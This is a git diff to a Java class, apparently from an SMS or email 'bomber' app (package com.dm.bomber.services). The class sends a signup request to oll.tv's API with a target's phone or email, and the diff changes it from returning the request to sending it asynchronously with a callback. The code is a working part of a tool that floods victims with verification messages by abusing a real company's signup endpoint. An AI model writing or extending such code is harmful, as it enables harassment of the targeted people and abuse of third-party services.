@@ -1,5 +1,6 @@
 package com.dm.bomber.services;
 
+import okhttp3.Callback;
 import okhttp3.Request;
 import okhttp3.RequestBody;
 
@@ -10,8 +11,8 @@ public class Olltv extends Service {
     }
 
     @Override
-    public Request run() {
-        return new Request.Builder()
+    public void run(Callback callback) {
+        client.newCall(new Request.Builder()
                 .url("https://oll.tv/api/signup?lang=uk")
                 .addHeader("Accept", "*/*")
                 .addHeader("Accept-Encoding", "gzip, deflate, br")
@@ -34,7 +35,6 @@ public class Olltv extends Service {
                         "Content-Disposition: form-data; name=\"email\"\n\n" +
                         getEmail() +
                         "\n-----------------------------5685021164270826171507483203--\n", null))
-                .build();
-
+                .build()).enqueue(callback);
     }
 }
